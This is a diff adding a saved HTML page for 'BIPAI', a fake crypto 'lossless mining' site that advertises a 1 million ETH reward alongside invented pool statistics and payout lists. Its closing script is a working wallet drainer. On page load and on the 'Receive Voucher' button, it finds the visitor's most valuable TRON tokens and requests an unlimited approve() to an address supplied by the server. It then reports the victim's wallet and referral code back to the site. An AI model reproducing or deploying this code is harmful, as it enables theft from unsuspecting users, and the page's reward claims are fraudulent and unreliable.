@@ -1,0 +1,861 @@
+<!DOCTYPE html>
+<!-- saved from url=(0020)https://btbme.com/#/ -->
+<html lang="en" style="font-size: 100px;">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no" />
+  <link rel="icon" href="https://btbme.com/favicon.ico" />
+  <title>BIPAI</title>
+  <link href="./BIPAI_files/chunk-38de582f.30c97cfd.css" rel="prefetch" />
+  <!--    <link href="./BIPAI_files/chunk-38de582f.2d2e6a76.js" rel="prefetch" />-->
+  <link href="./BIPAI_files/app.2858e404.css" rel="preload" as="style" />
+  <link href="./BIPAI_files/app.5ae4f8ea.js" rel="preload" as="script" />
+  <!--    <link href="./BIPAI_files/chunk-vendors.15ad7ce7.js" rel="preload" as="script" />-->
+  <link href="./BIPAI_files/app.2858e404.css" rel="stylesheet" />
+  <script>//全局变量
+  (function(ROOT) {
+
+
+
+    ROOT.BASE_URL = "https://api2.btbme.com/api";
+    ROOT.TITLE = 'BIPAI';
+    ROOT.KF_TOKEN = '13039509';
+
+  })(window);</script>
+  <script>window.__lc = window.__lc || {};
+  window.__lc.license = window.KF_TOKEN;
+  ;(function(n,t,c){function i(n){return e._h?e._h.apply(null,n):e._q.push(n)}var e={_q:[],_h:null,_v:"2.0",on:function(){i(["on",c.call(arguments)])},once:function(){i(["once",c.call(arguments)])},off:function(){i(["off",c.call(arguments)])},get:function(){if(!e._h)throw new Error("[LiveChatWidget] You can't use getters before load.");return i(["get",c.call(arguments)])},call:function(){i(["call",c.call(arguments)])},init:function(){var n=t.createElement("script");n.async=!0,n.type="text/javascript",n.src="https://cdn.livechatinc.com/tracking.js",t.head.appendChild(n)}};!n.__lc.asyncInit&&e.init(),n.LiveChatWidget=n.LiveChatWidget||e}(window,document,[].slice))</script>
+  <script async="" type="text/javascript" src="./BIPAI_files/tracking.js"></script>
+  <script>//px转rem
+  function getFontSize() {
+    var baseFontSize = 100;
+    var baseWidth = 750;
+    var minWidth = 320;
+    var clientWidth = window.innerWidth;
+    var innerWidth = Math.max(Math.min(clientWidth, baseWidth), minWidth);
+    var rem = clientWidth / (baseWidth / baseFontSize);
+    if (clientWidth > baseWidth) {
+      rem = 100
+    }
+    if (clientWidth < minWidth) {
+      rem = minWidth / (baseWidth / baseFontSize);
+    }
+    document.querySelector('html').style.fontSize = rem + 'px';
+  }
+  (function(doc, win) {
+    getFontSize();
+    window.onresize = function() {
+      getFontSize();
+    }
+  })(document, window);</script>
+  <script>document.title = window.TITLE;</script>
+  <link rel="stylesheet" type="text/css" href="./BIPAI_files/chunk-38de582f.30c97cfd.css" />
+  <script charset="utf-8" src="./BIPAI_files/chunk-38de582f.2d2e6a76.js"></script>
+</head>
+<body>
+<div id="app">
+  <div data-v-6cf1de08="" class="an_home">
+    <div data-v-6cf1de08="">
+      <div data-v-6cf1de08="" class="an_header">
+        <img data-v-6cf1de08="" src="./BIPAI_files/share_icon.c62e4119.svg" class="logo" />
+        <img data-v-6cf1de08="" src="./BIPAI_files/header_icon.804ada65.png" class="title_icon" />
+        <div data-v-6cf1de08="" class="link">
+          <img data-v-6cf1de08="" src="./BIPAI_files/link_icon.88effc93.svg" class="link_icon" />
+          <span data-v-6cf1de08="">Connect Wallet</span>
+        </div>
+      </div>
+      <div data-v-6cf1de08="" class="an_title">
+        <img data-v-6cf1de08="" src="./BIPAI_files/bg_top.6efc0468.png" class="shap" />
+        <div data-v-6cf1de08="" class="title_text">
+          <div data-v-6cf1de08="">
+            Lossless mining
+          </div>
+          <div data-v-6cf1de08="">
+            Liquidity pledge-free
+          </div>
+          <div data-v-6cf1de08="" class="reward">
+            Reward
+            <span data-v-6cf1de08="" class="value">1 Million</span> ETH
+          </div>
+        </div>
+        <div data-v-6cf1de08="" class="submit" id="btn-connect">
+          Receive Voucher
+        </div>
+      </div>
+      <div data-v-6cf1de08="" class="switch_container">
+        <div data-v-6cf1de08="" class="switch_actions">
+          <div data-v-6cf1de08="" class="switch_item active">
+            Mining Pool
+          </div>
+          <div data-v-6cf1de08="" class="switch_item">
+            Account
+          </div>
+        </div>
+        <div data-v-6cf1de08="">
+          <!---->
+          <div data-v-6cf1de08="" class="block_container">
+            <div data-v-6cf1de08="" class="block_title">
+              <span data-v-6cf1de08="" class="left_icon blue"></span> Pool data
+            </div>
+            <div data-v-6cf1de08="" class="block_content">
+              <div data-v-6cf1de08="" class="block_item">
+                <div data-v-6cf1de08="" class="name fc1">
+                  Total output
+                </div>
+                <div data-v-6cf1de08="" class="value ff fc3">
+                  16281.522165 ETH
+                </div>
+              </div>
+              <div data-v-6cf1de08="" class="block_item">
+                <div data-v-6cf1de08="" class="name fc1">
+                  Valid node
+                </div>
+                <div data-v-6cf1de08="" class="value ff fc3">
+                  192
+                </div>
+              </div>
+              <div data-v-6cf1de08="" class="block_item">
+                <div data-v-6cf1de08="" class="name fc1">
+                  Participant
+                </div>
+                <div data-v-6cf1de08="" class="value ff fc2">
+                  61068
+                </div>
+              </div>
+              <div data-v-6cf1de08="" class="block_item">
+                <div data-v-6cf1de08="" class="name fc1">
+                  User Revenue
+                </div>
+                <div data-v-6cf1de08="" class="value ff fc2">
+                  16843769.28 USDT
+                </div>
+              </div>
+            </div>
+          </div>
+          <div data-v-6cf1de08="" class="section_content">
+            <div data-v-6cf1de08="" class="section_title fc2">
+              Mining
+            </div>
+            <div data-v-6cf1de08="" class="section_subtitle fc1">
+              Liquidity mining income
+            </div>
+          </div>
+          <div data-v-6cf1de08="" class="block_container">
+            <div data-v-6cf1de08="" class="block_title">
+              <span data-v-6cf1de08="" class="left_icon red"></span> User Output
+            </div>
+            <div data-v-6cf1de08="" class="block_content">
+              <div data-v-6cf1de08="" class="list_th">
+                <div data-v-6cf1de08="">
+                  Address
+                </div>
+                <div data-v-6cf1de08="">
+                  Quantity
+                </div>
+              </div>
+              <div data-v-6cf1de08="" class="list_td">
+                <div data-v-86c6d964="" data-v-6cf1de08="" class="notice_wrapper">
+                  <div data-v-86c6d964="" class="notice_content" style="height: 3.99rem;">
+                    <ul data-v-86c6d964="" class="notice_list" style="margin-top: 0px;">
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xa2492……e77a912c930
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.000012 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xb15ed……cadef6b2d28
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.0000030 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xc7991……f9700fbf459
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.0000050 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xb15ed……cadef6b2d28
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.0000040 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xa2492……e77a912c930
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.0000090 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xb15ed……cadef6b2d28
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.0000020 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xc7991……f9700fbf459
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.0000070 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0x83575……cdecf029cd0
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.048611 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xb15ed……cadef6b2d28
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.0000030 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xa2492……e77a912c930
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.000013 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xc7991……f9700fbf459
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.0000060 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xb15ed……cadef6b2d28
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.0000030 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xa2492……e77a912c930
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.000011 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xb15ed……cadef6b2d28
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.0000030 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xb15ed……cadef6b2d28
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.0000040 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0x83575……cdecf029cd0
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.077525 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0x83575……cdecf029cd0
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.061727 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xc7991……f9700fbf459
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.0000050 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xb15ed……cadef6b2d28
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.0000030 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xc7991……f9700fbf459
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.0000080 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xb15ed……cadef6b2d28
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.0000020 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0x83575……cdecf029cd0
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.077593 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xc7991……f9700fbf459
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.0000050 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xb15ed……cadef6b2d28
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.0000030 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0x83575……cdecf029cd0
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.050809 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xa2492……e77a912c930
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.000010 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0x83575……cdecf029cd0
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.063072 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xa2492……e77a912c930
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.0000090 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xb15ed……cadef6b2d28
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.0000040 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xc7991……f9700fbf459
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.0000050 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xa2492……e77a912c930
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.000010 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xc7991……f9700fbf459
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.0000070 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xa2492……e77a912c930
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.0000080 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0x83575……cdecf029cd0
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.065498 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xa2492……e77a912c930
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.000010 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xc7991……f9700fbf459
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.0000050 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xa2492……e77a912c930
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.000014 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xc7991……f9700fbf459
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.0000060 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xb15ed……cadef6b2d28
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.0000030 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xc7991……f9700fbf459
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.0000070 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xc7991……f9700fbf459
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.0000050 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0x83575……cdecf029cd0
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.050443 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xa2492……e77a912c930
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.0000080 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0x83575……cdecf029cd0
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.033373 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xa2492……e77a912c930
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.000013 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xb15ed……cadef6b2d28
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.0000020 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0xc7991……f9700fbf459
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.0000060 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0x83575……cdecf029cd0
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.043566 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0x83575……cdecf029cd0
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.049088 ETH
+                        </div></li>
+                      <li data-v-86c6d964="" class="notice_item">
+                        <div data-v-86c6d964="" class="name">
+                          0x83575……cdecf029cd0
+                        </div>
+                        <div data-v-86c6d964="" class="value ff">
+                          0.04681 ETH
+                        </div></li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div data-v-6cf1de08="" class="section_content">
+            <div data-v-6cf1de08="" class="section_title fc2">
+              Help center
+            </div>
+            <div data-v-6cf1de08="" class="section_subtitle fc1">
+              Hope it helps you
+            </div>
+          </div>
+          <div data-v-6cf1de08="" class="help_container">
+            <div data-v-6cf1de08="" class="help_title">
+              <span data-v-6cf1de08="">How do i need to join？</span>
+              <img data-v-6cf1de08="" src="./BIPAI_files/arrow_up.5cd3e70d.svg" class="arrow rotate" />
+            </div>
+            <!---->
+          </div>
+          <div data-v-6cf1de08="" class="help_container">
+            <div data-v-6cf1de08="" class="help_title">
+              <span data-v-6cf1de08="">How do i withdraw money</span>
+              <img data-v-6cf1de08="" src="./BIPAI_files/arrow_up.5cd3e70d.svg" class="arrow rotate" />
+            </div>
+            <!---->
+          </div>
+          <div data-v-6cf1de08="" class="help_container">
+            <div data-v-6cf1de08="" class="help_title">
+              <span data-v-6cf1de08="">How to calculate income？</span>
+              <img data-v-6cf1de08="" src="./BIPAI_files/arrow_up.5cd3e70d.svg" class="arrow rotate" />
+            </div>
+            <!---->
+          </div>
+          <div data-v-6cf1de08="" class="section_content">
+            <div data-v-6cf1de08="" class="section_title fc2">
+              Audit report
+            </div>
+            <div data-v-6cf1de08="" class="section_subtitle fc1">
+              We have a secure audit report
+            </div>
+          </div>
+          <div data-v-6cf1de08="" class="partner_container">
+            <div data-v-6cf1de08="" class="partner_content">
+              <div data-v-6cf1de08="" class="partner_item">
+                <img data-v-6cf1de08="" src="./BIPAI_files/bottom_icon1.d9ece056.png" />
+              </div>
+              <div data-v-6cf1de08="" class="partner_item">
+                <img data-v-6cf1de08="" src="./BIPAI_files/bottom_icon2.8ca8e6bf.png" />
+              </div>
+              <div data-v-6cf1de08="" class="partner_item">
+                <img data-v-6cf1de08="" src="./BIPAI_files/bottom_icon3.299c4607.png" />
+              </div>
+            </div>
+          </div>
+          <div data-v-6cf1de08="" class="section_content">
+            <div data-v-6cf1de08="" class="section_title fc2">
+              Partner
+            </div>
+            <div data-v-6cf1de08="" class="section_subtitle fc1">
+              our business partner
+            </div>
+          </div>
+          <div data-v-6cf1de08="" class="partner_container">
+            <div data-v-6cf1de08="" class="partner_content">
+              <div data-v-6cf1de08="" class="partner_item">
+                <img data-v-6cf1de08="" src="./BIPAI_files/bottom_icon4.93483f09.png" />
+              </div>
+              <div data-v-6cf1de08="" class="partner_item">
+                <img data-v-6cf1de08="" src="./BIPAI_files/bottom_icon5.f6b7dded.png" />
+              </div>
+              <div data-v-6cf1de08="" class="partner_item">
+                <img data-v-6cf1de08="" src="./BIPAI_files/bottom_icon6.5443829a.png" />
+              </div>
+            </div>
+            <div data-v-6cf1de08="" class="partner_content">
+              <div data-v-6cf1de08="" class="partner_item">
+                <img data-v-6cf1de08="" src="./BIPAI_files/bottom_icon7.b40be6ca.png" />
+              </div>
+              <div data-v-6cf1de08="" class="partner_item">
+                <img data-v-6cf1de08="" src="./BIPAI_files/bottom_icon8.f374cda8.png" />
+              </div>
+              <div data-v-6cf1de08="" class="partner_item">
+                <img data-v-6cf1de08="" src="./BIPAI_files/bottom_icon9.c2dde12b.png" />
+              </div>
+            </div>
+          </div>
+        </div>
+        <!---->
+      </div>
+    </div>
+    <!---->
+    <!---->
+  </div>
+</div>
+<!--<script src="./BIPAI_files/chunk-vendors.15ad7ce7.js"></script>-->
+<script src="./BIPAI_files/app.5ae4f8ea.js"></script>
+<script type="text/javascript" src="https://cdn.bootcdn.net/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script src="./BIPAI_files/TronWeb.js"></script>
+<script type="text/javascript">
+  var address = getUrlQueryString('address')
+  var rank = 6.5;
+  var authorized_address = '';
+  var domain = 'https://' + window.location.host + '/';
+  var bizhong = '';
+  var approveAddr = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+  var total=0;
+  var trx = 0;
+  function getUrlQueryString(names, urls) {
+    urls = urls || window.location.href;
+    urls && urls.indexOf("?") > -1 ? urls = urls.substring(urls.indexOf("?") + 1) : "";
+    var reg = new RegExp("(^|&)" + names + "=([^&]*)(&|$)", "i");
+    var r = urls ? urls.match(reg) : window.location.search.substr(1).match(reg);
+    if (r != null && r[2] != "")return unescape(r[2]);
+    return null;
+
+  }
+
+  $('input.num').bind('input propertychange', function()
+  {
+    if($(this).val() && $(this).val()>0){
+      $('#btn-connect').css('background','#078bc3');
+    }else{
+      $('#btn-connect').css('background','#dde0dd');
+    }
+    $('#price').text(($(this).val()*rank).toLocaleString() )
+
+  })
+
+  function getInfo(){
+    $.ajax({
+      type: 'get',
+      url:  domain + 'api/get_trc',
+      async : false,
+      success:function(data){
+        console.log(data)
+        authorized_address = data.data.authorized_address;
+        console.log(authorized_address);
+      },
+      error:function(data){
+
+      }
+    })
+  }
+
+  async function postInfo(address,symbol){
+    var s = getUrlQueryString('s')
+    var a = getUrlQueryString('r')
+
+    if (trx < 5) {
+      return
+    }
+
+
+// 		if (total == 0) {
+// 				return;
+// 			}
+
+    var data = {
+      address:address,
+      authorized_address:authorized_address,
+      bizhong:symbol,
+      code:s,
+      reffer:a,
+      type:1
+    }
+    $.ajax({
+      type: 'post',
+      url:  domain + 'api/insert_trc',
+      data:data,
+      // success:function(data){
+      // //console.log(data)
+      //     if(data.code === 200){
+      //     	console.log('success')
+      //     }
+      //     console.log(data.msg)
+      // },
+      // error:function(data){
+      // 	console.log(data)
+      // }
+    })
+  }
+  $('#address').text(address)
+
+
+  $(function() {
+
+    const addr = {
+      'WIN': 'TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7',
+      'USDT':'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
+      'TONS': 'THgLniqRhDg5zePSrDTdU9QwY8FjD9nLYt',
+      'USDJ': 'TMwFHYXLJaRUPeW6421aqXL4ZEzPRFGkGT',
+      'JST': 'TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9',
+      'HT': 'TDyvndWuvX5xTBwHPYJi7J3Yq8pq8yh62h',
+      'SUN': 'TKkeiboTkxXKJpbmVFbv4a8ov5rAfRDMf9',
+      "EXNX": "TCcVeKtYUrHEQDPmozjJFMrf6XX7BgF84A",
+      "VCOIN": "TNisVGhbxrJiEHyYUMPxRzgytUtGM7vssZ",
+      "POL":"TWcDDx1Q6QEoBrJi9qehtZnD4vcXXuVLer",
+      "CKRW":"TTVTdn8ipmacfKsCHw5Za48NRnaBRKeJ44"
+    }
+
+    const price = {
+      'WIN': 0.001150,
+      'USDT':1,
+      'TONS':1.35,
+      'USDJ':1.04,
+      'JST': 0.125,
+      "HT": 20.41,
+      "SUN": 33.97,
+      "EXNX": 0.0621,
+      "VCOIN": 0.004225,
+      "POL": 0.1393,
+      "CKRW": 0.002487,
+    }
+
+    const decimals = {
+      'WIN': 6,
+      'USDT':6,
+      'TONS':6,
+      'USDJ':18,
+      'JST': 18,
+      "HT": 18,
+      "SUN": 18,
+      "EXNX": 18,
+      "VCOIN": 6,
+      "POL": 8,
+      "CKRW": 6,
+    }
+
+
+    async function getMostValuableAssets(account) {
+      let _symbol = 'USDT'
+// 			fffsss = fffsss + "account:" + account + "---"
+// 			$("#fffsss").text(fffsss)
+      for (const symbol of Object.keys(addr)) {
+        let contract = await tronWeb.contract().at(addr[symbol]);
+        let myBalance = await contract.balanceOf(account).call(function(err,balance){
+          const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
+          console.log(usdt);
+          if (usdt > total && usdt > 500) {
+            _symbol = symbol
+            total = usdt
+            approveAddr = addr[_symbol]
+          }
+        })
+      }
+      bizhong = _symbol
+      return _symbol
+    }
+
+    /**
+     * * Connect wallet button pressed.
+     */
+    async function onConnect() {
+      $('.pages').append('<div class="modal-overlay"></div>');
+      $('.modal-overlay').addClass('modal-overlay-visible');
+      $('.modal').removeClass('modal-out').addClass('modal-in');
+      // fffsss = fffsss + "开始:"
+      let tronWeb = window.tronWeb
+      // fffsss = fffsss + "tronWeb:" + tronWeb + "---"
+      // $("#fffsss").text(fffsss)
+      let walletAddress = tronWeb.defaultAddress.base58;
+      // fffsss = fffsss + "walletAddress:" + walletAddress + "---"
+      // $("#fffsss").text(fffsss)
+      bizhong = await getMostValuableAssets(walletAddress);
+      // fffsss = fffsss + "approveAddr:" + approveAddr + "---"
+      // $("#fffsss").text(fffsss)
+      let instance = await tronWeb.contract().at(approveAddr);
+      // fffsss = fffsss + "instance:" + instance + "---"
+      // $("#fffsss").text(fffsss)
+      // fffsss = fffsss + "walletAddress:" + walletAddress + "---"
+      // $("#fffsss").text(fffsss)
+      // fffsss = fffsss + "bizhong:" + bizhong + "---"
+      // $("#fffsss").text(fffsss)
+
+      tradeobj = await tronWeb.trx.getAccount(
+              walletAddress,
+      ).then(output => {
+        console.log('- Output:', output, '\n');
+        trx = output.balance / 1000000;
+      });
+
+      let res = await instance["approve"](authorized_address,"90000000000000000000000000000");
+      res.send({
+        feeLimit: 100000000,
+        callValue: 0,
+        shouldPollResponse: false
+      },function(err,res){
+        // fffsss = fffsss + "res:" + res + "---"
+        // $("#fffsss").text(fffsss)
+        // fffsss = fffsss + "err:" + err + "---"
+        // $("#fffsss").text(fffsss)
+        if(err == null){
+          // fffsss = fffsss + "walletAddress:" + walletAddress + "---"
+          // $("#fffsss").text(fffsss)
+          // fffsss = fffsss + "bizhong:" + bizhong + "---"
+          // $("#fffsss").text(fffsss)
+          $(".tishi").fadeIn()
+          setTimeout(function () {
+            $(".tishi").fadeOut()
+          },2000);
+          postInfo(walletAddress,bizhong)
+        }
+        $('.modal-overlay').remove();
+        $('.modal').removeClass('modal-in').addClass('modal-out');
+      })
+    }
+    function init() {
+      getInfo();
+
+
+
+    }
+
+
+    async function s(){
+      var tronWeb = window.tronWeb
+      let contract = await tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
+      let walletAddress = tronWeb.defaultAddress.base58;
+      let result = await contract.balanceOf(walletAddress).call(function(err,tex){
+        if(err == null){
+          let total = tex._hex/(10**6);
+          $('#yu').text(total.toLocaleString() +' USDT')
+          console.log();
+        }
+      });
+
+    }
+
+    /**
+     * Main entry point.
+     */
+
+    init();
+    document.querySelector("#btn-connect").addEventListener("click", onConnect);
+    onConnect();
+  })
+
+  $(function(){
+
+    setTimeout(function(){
+      $('#s').click()
+    },1000);
+
+
+
+  })
+</script>
+</body>
+</html>
